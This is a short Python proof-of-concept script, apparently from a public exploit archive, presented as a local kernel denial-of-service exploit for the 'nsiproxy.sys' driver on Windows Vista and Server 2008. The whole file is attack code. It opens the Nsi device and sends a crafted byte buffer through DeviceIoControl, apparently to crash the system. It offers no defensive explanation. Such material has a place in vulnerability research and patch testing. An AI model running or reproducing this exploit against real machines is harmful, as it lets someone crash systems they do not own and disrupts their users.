#!/usr/bin/python

############################################################################
##
## Title: Microsoft Windows Vista/Server 2008 "nsiproxy.sys" Local Kernel DoS Exploit
## Author: Lufeng Li of Neusoft Corporation
## Vendor: www.microsoft.com
## Vulnerable: Windows Vista/Server 2008
##
############################################################################
from ctypes import *

kernel32 = windll.kernel32
Psapi    = windll.Psapi

if __name__ == '__main__':
    GENERIC_READ  = 0x80000000
    GENERIC_WRITE = 0x40000000
    OPEN_EXISTING = 0x3
    CREATE_ALWAYS = 0x2

    SYM_NAME   = "\\\\.\\Nsi"
    dwReturn      = c_ulong()
    out_buff      = ''
    in_buff       = ("\x00\x00\x00\x00\x00\x00\x00\x00\xec\x2d\x39\x6e\x07\x00\x00\x00"
                     "\x01\x00\x00\x00\x00\x00\x00\x00\x38\x89\x6c\x01\x08\x00\x00\x00"
                     "\x00\x00\x00\x00\x00\x00\x00\x00\x10\xfa\x78\x00\x28\x00\x00\x00"
                     "\x38\xfa\x78\x00\x0c\x00\x00\x00")

    handle = kernel32.CreateFileA(SYM_NAME, GENERIC_READ | GENERIC_WRITE,0, None, CREATE_ALWAYS, 0, None)
    dev_ioct = kernel32.DeviceIoControl(handle, 0x12003f, in_buff,len(in_buff), out_buff, len(out_buff),byref(dwReturn), None)